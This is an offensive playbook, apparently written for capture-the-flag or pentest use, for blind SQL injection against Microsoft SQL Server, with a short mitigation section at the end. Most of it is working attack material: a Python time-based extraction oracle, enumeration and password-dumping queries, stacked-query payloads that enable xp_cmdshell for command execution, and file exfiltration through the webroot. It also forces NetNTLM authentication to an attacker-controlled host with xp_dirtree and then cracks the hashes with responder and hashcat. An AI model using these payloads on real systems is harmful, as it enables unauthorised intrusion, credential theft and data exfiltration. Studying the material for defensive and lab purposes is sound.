# MSSQL Blind SQLi — Enumeration, Stacked Queries & RCE

MSSQL-specific playbook for blind injection: extract data with `WAITFOR DELAY`, walk the
schema with `OFFSET/FETCH`, then escalate via **stacked queries** to `xp_cmdshell` RCE and
`xp_dirtree` NetNTLM capture. MSSQL allows multiple statements separated by `;`, which is
what makes the escalation possible.

## Time oracle + bit extraction

```python
def oracle(condition):                       # True if DB slept
    payload = quote(f"';IF({condition}) WAITFOR DELAY '0:0:{DELAY}';--")
    start = time.time()
    requests.get(f"{TARGET}/index.php", cookies={"TrackingId": payload})
    return time.time() - start >= DELAY

def dump_string(query, length):
    out = ""
    for i in range(1, length + 1):
        ch = 0
        for b in range(7):                   # 7 bits = ASCII printable
            if oracle(f"ASCII(SUBSTRING(({query}),{i},1)) & {2**b} > 0"):
                ch |= 2**b
        out += chr(ch)
    return out
```

## Schema enumeration (MSSQL syntax)

```sql
DB_NAME()                                              -- current database
SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='<db>'
-- iterate rows without LIMIT (MSSQL uses OFFSET/FETCH, requires ORDER BY):
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
  WHERE TABLE_CATALOG='<db>' ORDER BY TABLE_NAME
  OFFSET <i> ROWS FETCH NEXT 1 ROWS ONLY
-- pull a credential:
SELECT TOP 1 password FROM users
```

Wrap each in `LEN(...)` first to get the length, then `dump_string`.

## Stacked queries → enable xp_cmdshell

`xp_cmdshell` is off by default; turn it on in two steps (advanced options first, or the
second call silently no-ops):

```sql
EXEC sp_configure 'Show Advanced Options','1'; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell','1'; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

In an injection point that needs a string prefix (e.g. a captcha field
`... WHERE answer='<input>'`), the stacked-query format is:

```
1' OR '1'='1';<YOUR_SQL>;--
```

`1' OR '1'='1'` satisfies the original check, `;` starts the new statement, `--` kills the
trailing quote. Don't reuse the numeric `5';...` form from a numeric injection point — the
quoting must match the column's context.

## Read/write files via xp_cmdshell

```sql
-- exfil a file by copying it into the webroot, then HTTP GET it
EXEC xp_cmdshell 'type C:\flag.txt > C:\Apache24\htdocs\out.txt';
```

**Find the webroot** by forcing a PHP fatal error (e.g. a UNION attempt) — the error path
leaks the absolute file location (`C:\Apache24\htdocs\new.php:19`).

## NetNTLM hash capture via xp_dirtree

Force the SQL server to authenticate to your SMB listener; capture and crack the NetNTLMv2:

```bash
sudo responder -I tun0
```
```sql
EXEC master..xp_dirtree '\\YOUR_IP\share', 1, 1;   -- via any injection point
```
```bash
hashcat -m 5600 -w 3 -O 'NETNTLMV2_HASH' /usr/share/wordlists/rockyou.txt
```

## Gotchas

- **String vs numeric context** decides the injection prefix — match the column's quoting.
- **Rotating tokens** (captcha IDs) must be re-fetched per request; don't reuse.
- **Login field names** can be abbreviated (`e`/`p` not `email`/`password`) — wrong names
  return 200 with the login page, not an error.
- `xp_cmdshell` blocks until the command finishes — long commands make the request hang;
  that's expected, the side effect already happened.

## Mitigation

Prepared statements; run SQL Server as a low-priv service account (no local admin, no SMB
egress); keep `xp_cmdshell` disabled and revoke `ALTER SETTINGS`; egress-filter outbound
SMB to stop `xp_dirtree` hash theft.
